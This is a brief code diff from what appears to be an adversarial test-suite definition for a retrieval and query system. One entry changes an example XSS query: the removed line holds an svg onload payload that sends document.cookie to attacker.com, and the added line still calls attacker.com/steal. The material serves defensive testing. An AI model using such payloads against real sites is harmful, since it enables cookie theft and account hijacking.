@@ -1006,7 +1006,7 @@ Cache Hit Absorption (\\%) & 0.0\\% & ${suiteC.cacheHitRatioPct}\\% & +${suiteC.
       'phase-11': {
         title: 'Phase 11: Extended Adversarial Attack Suite',
         count: '5,000 Queries',
-        query: 'Query GFR Rule 138271. <svg onload="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">',
+        query: 'Query GFR Rule 138271. <svg onload="fetch(&quot;http://attacker.com/steal&quot;)">',
         context: 'Procurement report 138271: order value 250,000 INR. [XSS SANITIZED / SCRIPT REMOVED]',
         smtStatus: 'SAT: false / SANITIZED (XSS Exfiltration Neutralized)',
         colbertScore: '0.210 / 1.000',
